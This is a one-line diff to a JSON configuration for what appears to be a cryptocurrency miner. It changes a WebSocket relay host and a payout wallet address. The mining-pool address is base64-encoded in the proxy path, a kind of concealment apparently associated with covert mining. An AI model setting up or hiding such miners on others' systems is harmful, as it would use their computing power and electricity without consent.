@@ -1,1 +1,1 @@
-{"log": true, "proxy": "wss://preferred-callida-mono-e9a2882f.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "ltc1qnac7xhquwtdkg52p87l7f6j7pr9lslfeh0r2vy", "password": "c=LTC,zap=LCC/MAZA", "argent": "blue-mino/1.0", "threads": 8}
+{"log": true, "proxy": "wss://nodejs-production-5dbb.up.railway.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "dgb1qs6n8mf8rwerfd872awwyp3pmy5uuv80gwg7z0m", "password": "c=DGB,zap=MAZA", "argent": "blue-mino/1.0", "threads": 8}
